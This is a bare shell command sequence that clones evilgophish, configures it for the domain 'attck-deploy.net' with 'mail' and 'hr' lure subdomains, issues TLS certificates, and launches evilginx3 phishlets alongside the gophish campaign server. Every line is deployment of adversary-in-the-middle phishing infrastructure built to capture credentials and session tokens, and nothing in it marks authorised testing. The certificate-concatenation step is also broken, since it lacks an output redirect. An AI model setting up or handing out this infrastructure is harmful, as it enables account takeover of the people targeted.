cd /opt/
git clone https://github.com/fin3ss3g0d/evilgophish.git
cd evilgophish

./setup.sh attck-deploy.net "mail hr" false true user_id false

certbot certonly --manual --preferred-challenges=dns --email attck.community@gmail.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d 'mail.attck-deploy.net' -d 'hr.attck-deploy.net'

mkdir /opt/ssl
cat /etc/letsencrypt/live/mail.attck-deploy.net/fullchain.pem /etc/letsencrypt/live/mail.attck-deploy.net/privkey.pem /opt/ssl/attck-certkey.pem

./evilginx3 -g /opt/evilgophish/gophish/gophish.db -p legacy_phishlets

cd /opt/evilgophish/gophish
./gophish